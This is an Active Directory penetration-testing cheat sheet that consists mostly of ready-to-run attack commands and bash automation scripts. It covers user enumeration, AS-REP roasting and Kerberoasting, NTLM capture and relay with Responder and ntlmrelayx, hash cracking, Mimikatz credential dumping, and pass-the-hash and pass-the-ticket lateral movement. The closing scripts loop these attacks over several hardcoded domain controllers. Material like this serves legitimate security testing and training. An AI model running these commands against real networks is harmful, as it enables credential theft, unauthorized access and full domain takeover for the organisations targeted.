# ACTIVE DIRECTORY PENTESTING COMPLETE CHEAT SHEET

## 1. WHAT IS ACTIVE DIRECTORY?

**Active Directory (AD)** is Microsoft's directory service for Windows domain networks. It stores information about users, computers, groups, and policies, and provides authentication/authorization via Kerberos and NTLM. Common attack surface includes:

- **User enumeration** (LDAP, RPC, Kerberos)
- **Kerberoasting / AS-REP Roasting** (credential extraction)
- **SMB shares** (misconfigurations, null sessions)
- **NTLM Relay / Responder** (capture and relay hashes)
- **Lateral movement** (Pass-the-Hash, Pass-the-Ticket, WMI, PsExec)
- **AD CS abuse** (certificate templates)
- **ACL abuse** (GenericAll, WriteDACL, etc.)

**Key fact:** AD is the crown jewel in most corporate environments; compromising the Domain Controller usually means total domain takeover.

---

## 2. INITIAL ENUMERATION

### 2.1 Port Scanning (Key AD Ports)

```bash
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389 -sV -Pn <IP_DC>
nmap -sC -sV -Pn <IP_DC>
```

### 2.2 Domain Discovery via DNS

```bash
dig -x <IP_DC>
dig ANY @<IP_DC> <domain>
```

### 2.3 LDAP Base Enumeration (Anonymous)

```bash
ldapsearch -x -H ldap://<IP_DC> -s base
ldapsearch -x -H ldap://<IP_DC> -b "DC=domain,DC=local"
ldapsearch -x -H ldap://<IP_DC> -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName
```

### 2.4 SMB Enumeration (No Credentials)

```bash
smbclient -L //<IP_DC> -N
rpcclient -U "" <IP_DC>
enum4linux-ng -A <IP_DC>
```

### 2.5 SMB Enumeration (With Credentials)

```bash
smbclient -L //<IP_DC> -U "<domain>/<user>"
smbclient //<IP_DC>/<share> -U "<domain>/<user>"
smbmap -H <IP_DC> -u '<user>' -p '<password>'
```

### 2.6 AS-REP User Existence Test

```bash
impacket-GetNPUsers <domain>/ -dc-ip <IP_DC> -no-pass
```

---

## 3. RDP CONNECTION

```bash
xfreerdp3 /v:<IP_DC> /u:<domain>\\<user> /p:'<password>' /cert:ignore
```

---

## 4. LDAP ENUMERATION (AUTHENTICATED)

```bash
ldapsearch -H ldap://<IP_DC> -D "<user>@<domain>" -w "<pass>" -b "DC=domain,DC=local"
ldapsearch -H ldap://<IP_DC> -D "<user>@<domain>" -w "<pass>" -b "''" -s sub
```

**Full LDAP dump with ldapdomaindump:**
```bash
ldapdomaindump ldap://<IP_DC> -u "<DOMAIN>\<user>" -p '<password>'
```

---

## 5. SMB / WINRM / RPC ENUMERATION (CRACKMAPEXEC)

```bash
crackmapexec smb <IP_DC> -u <user> -p <pass>
crackmapexec smb <IP_DC> -u <user> -p <pass> --shares
crackmapexec smb <IP_DC> -u <user> -p <pass> --users
crackmapexec smb <IP_DC> -u <user> -p <pass> --groups
crackmapexec smb <IP_DC> -u <user> -p <pass> --sessions
crackmapexec smb <IP_DC> -u <user> -p <pass> --pass-pol
```

---

## 6. KERBEROS ENUMERATION

### 6.1 Kerberos Ticket Validation

```bash
kinit <user>@<DOMAIN>
klist
```

### 6.2 AS-REP Roasting (No Pre-Auth Users)

```bash
impacket-GetNPUsers <domain>/ -dc-ip <IP_DC> -no-pass
impacket-GetNPUsers <domain>/ -dc-ip <IP_DC> -usersfile users.txt -format hashcat -outputfile asrep.hashes
```

### 6.3 Kerberoasting (SPN Extraction)

```bash
impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <IP_DC> -request
impacket-GetUserSPNs <domain>/<user>:<pass> -outputfile kerberoast.hashes
```

### 6.4 Kerbrute (User Enumeration via Kerberos)

```bash
wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64
chmod +x kerbrute_linux_amd64
sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute

kerbrute userenum --dc <IP_DC> -d <domain> userlist.txt --output kerbrute_users.txt
```

---

## 7. WINRM (POWERSHELL REMOTE)

```bash
crackmapexec winrm <IP_DC> -u <user> -p <pass>
evil-winrm -i <IP_DC> -u <user> -p "<pass>"
evil-winrm -i <IP_DC> -u <user> -H "<NTLM_HASH>"
```

---

## 8. SMB & NTLM RELAY

```bash
responder -I <interface>
ntlmrelayx.py -tf targets.txt -smb2support
hashcat -m 5600 hashes.txt wordlist.txt
```

---

## 9. LATERAL MOVEMENT

### 9.1 Credential Dumping (Mimikatz)

```bash
mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit
```

### 9.2 Pass-the-Hash

```bash
impacket-psexec <domain>/<user>@<IP_DC> -hashes <LM:NT>
impacket-wmiexec <domain>/<user>@<IP> -hashes <LM:NT>
```

### 9.3 Pass-the-Ticket

```bash
export KRB5CCNAME=<ticket.ccache>
impacket-psexec <domain>/<user>@<IP_TARGET>
export KRB5CCNAME=$(pwd)/ticket.ccache
```

---

## 10. BLOODHOUND (AD ATTACK PATH MAPPING)

```bash
bloodhound-python -d <domain> -u <user> -p <pass> -ns <IP_DC> -c All
bloodhound &
```

---

## 11. TIPS

### 11.1 Check Password Policy

```bash
crackmapexec smb <IP_DC> -u <user> -p <pass> --pass-pol
```

### 11.2 Check if User is Locked

```bash
rpcclient -U "<user>%<pass>" <IP_DC>
  queryuser <RID>
```

### 11.3 Mount SMB as Local Directory

```bash
sudo mount -t cifs //<IP>/<share> /mnt/smb -o username=<user>,password=<pass>,domain=<domain>
```

### 11.4 Export Kerberos Ticket for Other Tools

```bash
export KRB5CCNAME=$(pwd)/ticket.ccache
```

### 11.5 Crack AS-REP Hashes

```bash
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt --force
```

---

## 12. AUTOMATION SCRIPTS

### 12.1 ad_enum.sh — Multi-DC Enumerator

```bash
#!/bin/bash
DCs=(192.168.1.10 192.168.1.22 192.168.1.23 192.168.1.103 192.168.1.105)
OUTDIR="ad_enum"

mkdir -p "$OUTDIR"

echo "[*] Starting AD enumeration" | tee "$OUTDIR/summary.txt"
echo "==================================" >> "$OUTDIR/summary.txt"

for DC in "${DCs[@]}"; do
    echo -e "\n[*] Enumerating DC: $DC"
    mkdir -p "$OUTDIR/$DC"

    ping -c 1 -W 1 $DC &>/dev/null
    if [ $? -ne 0 ]; then
        echo "[-] $DC not responding" | tee -a "$OUTDIR/summary.txt"
        continue
    fi

    echo "[+] $DC active" | tee -a "$OUTDIR/summary.txt"

    ldapsearch -x -H ldap://$DC -s base > "$OUTDIR/$DC/ldap_base.txt" 2>/dev/null

    DOMAIN=$(grep -i "rootDomainNamingContext" "$OUTDIR/$DC/ldap_base.txt" | awk '{print $2}')

    if [ -n "$DOMAIN" ]; then
        echo "[+] Domain detected on $DC: $DOMAIN" | tee -a "$OUTDIR/summary.txt"
    else
        echo "[-] Could not detect domain on $DC" | tee -a "$OUTDIR/summary.txt"
    fi

    smbclient -L //$DC -N > "$OUTDIR/$DC/smb_shares.txt" 2>&1
    smbclient //$DC/SYSVOL -N > "$OUTDIR/$DC/sysvol.txt" 2>&1
    echo "enumdomusers" | rpcclient -U "" $DC > "$OUTDIR/$DC/rpc.txt" 2>&1

    if [ -n "$DOMAIN" ]; then
        GetNPUsers.py "$DOMAIN/" -dc-ip $DC -no-pass > "$OUTDIR/$DC/asrep.txt" 2>&1
    fi

done

echo -e "\n[*] Enumeration finished" | tee -a "$OUTDIR/summary.txt"
```

### 12.2 ad_enum_fixed.sh — Multi-DC with Known Domains

```bash
#!/bin/bash

declare -A DC_DOMAINS
DC_DOMAINS["192.168.1.10"]="modominio.local"
DC_DOMAINS["192.168.1.22"]="midominio.local"
DC_DOMAINS["192.168.1.23"]="midominio.local"
DC_DOMAINS["192.168.1.103"]="cs.org"
DC_DOMAINS["192.168.1.105"]="s4vicorp.local"

DCS=("192.168.1.10" "192.168.1.22" "192.168.1.23" "192.168.1.103" "192.168.1.105")

OUTDIR="AD_ENUM"
mkdir -p "$OUTDIR"

echo "[*] Starting multi-DC AD enumeration"

for DC in "${DCS[@]}"; do
    DOMAIN="${DC_DOMAINS[$DC]}"
    BASE_DN=$(echo "$DOMAIN" | sed 's/\./,DC=/g; s/^/DC=/')

    echo
    echo "=============================="
    echo "[+] Enumerating DC: $DC"
    echo "[+] Real domain: $DOMAIN"
    echo "=============================="

    DC_DIR="$OUTDIR/$DC"
    mkdir -p "$DC_DIR"

    crackmapexec smb "$DC" --shares > "$DC_DIR/cme_shares.txt"
    crackmapexec smb "$DC" --users  > "$DC_DIR/cme_users.txt"
    crackmapexec smb "$DC" --groups > "$DC_DIR/cme_groups.txt"

    cat "$DC_DIR/cme_users.txt" | awk '{print $5}' | grep -v '^$' | sort -u > "$DC_DIR/users.txt"

    ldapsearch -x -H "ldap://$DC" -b "$BASE_DN" > "$DC_DIR/ldap_dump.txt" 2>/dev/null

    rpcclient -U "" -N "$DC" -c "enumdomusers" > "$DC_DIR/rpc_users.txt" 2>/dev/null

    if [ -s "$DC_DIR/users.txt" ]; then
        GetNPUsers.py "$DOMAIN/" -dc-ip "$DC" -usersfile "$DC_DIR/users.txt" -no-pass > "$DC_DIR/asrep.txt" 2>/dev/null
    fi

    GetUserSPNs.py "$DOMAIN/" -dc-ip "$DC" -no-pass > "$DC_DIR/kerberoast.txt" 2>/dev/null

    echo "[✓] DC $DC completed"
done

echo
echo "[🔥] Enumeration finished. Results in $OUTDIR/"
```

### 12.3 kerbrute_multi_dc.sh

```bash
#!/bin/bash

declare -A DC_DOMAINS
DC_DOMAINS["192.168.1.10"]="modominio.local"
DC_DOMAINS["192.168.1.22"]="midominio.local"
DC_DOMAINS["192.168.1.23"]="midominio.local"
DC_DOMAINS["192.168.1.103"]="cs.org"
DC_DOMAINS["192.168.1.105"]="s4vicorp.local"

DCS=("192.168.1.10" "192.168.1.22" "192.168.1.23" "192.168.1.103" "192.168.1.105")

WORDLIST="userlist.txt"
OUTDIR="AD_ENUM"
mkdir -p "$OUTDIR"

if [ ! -f "$WORDLIST" ]; then
    echo "[-] $WORDLIST not found"
    exit 1
fi

echo "[*] Starting Kerberos User Enumeration"

for DC in "${DCS[@]}"; do
    DOMAIN="${DC_DOMAINS[$DC]}"
    DC_DIR="$OUTDIR/$DC"
    mkdir -p "$DC_DIR"

    echo
    echo "=============================="
    echo "[+] DC: $DC"
    echo "[+] Domain: $DOMAIN"
    echo "=============================="

    kerbrute userenum --dc "$DC" -d "$DOMAIN" "$WORDLIST" --output "$DC_DIR/kerbrute_users.txt"

    echo "[✓] Kerberos enum finished for $DC"
done

echo
echo "[🔥] Kerberos enumeration finished"
```

### 12.4 asrep_multi_dc.sh

```bash
#!/bin/bash

declare -A DC_DOMAINS
DC_DOMAINS["192.168.1.10"]="modominio.local"
DC_DOMAINS["192.168.1.22"]="midominio.local"
DC_DOMAINS["192.168.1.23"]="midominio.local"
DC_DOMAINS["192.168.1.103"]="cs.org"
DC_DOMAINS["192.168.1.105"]="s4vicorp.local"

OUTDIR="AD_ENUM"

echo "[*] Starting targeted AS-REP Roasting"

for DC in "${!DC_DOMAINS[@]}"; do
    DOMAIN="${DC_DOMAINS[$DC]}"
    DC_DIR="$OUTDIR/$DC"
    USERS_FILE="$DC_DIR/kerbrute_users.txt"

    if [ ! -f "$USERS_FILE" ]; then
        continue
    fi

    awk '{print $NF}' "$USERS_FILE" | cut -d'@' -f1 > "$DC_DIR/asrep_users.txt"

    if [ ! -s "$DC_DIR/asrep_users.txt" ]; then
        continue
    fi

    echo
    echo "=============================="
    echo "[+] DC: $DC"
    echo "[+] Domain: $DOMAIN"
    echo "=============================="

    GetNPUsers.py "$DOMAIN/" -dc-ip "$DC" -usersfile "$DC_DIR/asrep_users.txt" -no-pass > "$DC_DIR/asrep_hashes.txt" 2>/dev/null

    echo "[✓] AS-REP completed for $DC"
    cat $DC_DIR/asrep_hashes.txt
done

echo
echo "[🔥] AS-REP Roasting finished"
```

---

## 13. TOOLS

| Tool                   | Usage                                                                 |
| ---------------------- | --------------------------------------------------------------------- |
| **Impacket**           | Suite for AD attacks (GetNPUsers, GetUserSPNs, psexec, wmiexec, etc.) |
| **CrackMapExec (CME)** | SMB/WinRM/LDAP enumeration and exploitation                           |
| **BloodHound**         | Attack path visualization                                             |
| **Responder**          | LLMNR/NBT-NS/mDNS poisoner                                            |
| **ntlmrelayx**         | NTLM relay attacks                                                    |
| **Kerbrute**           | Kerberos user enumeration                                             |
| **evil-winrm**         | WinRM interactive shell                                               |
| **Mimikatz**           | Credential extraction                                                 |
| **ldapdomaindump**     | LDAP enumeration to HTML/JSON                                         |
| **enum4linux-ng**      | SMB/LDAP enumeration                                                  |
| **smbmap**             | SMB share enumeration                                                 |
| **rpcclient**          | RPC enumeration                                                       |
| **xfreerdp**           | RDP client                                                            |
| **hashcat**            | Hash cracking (modes 5600, 18200, etc.)                               |
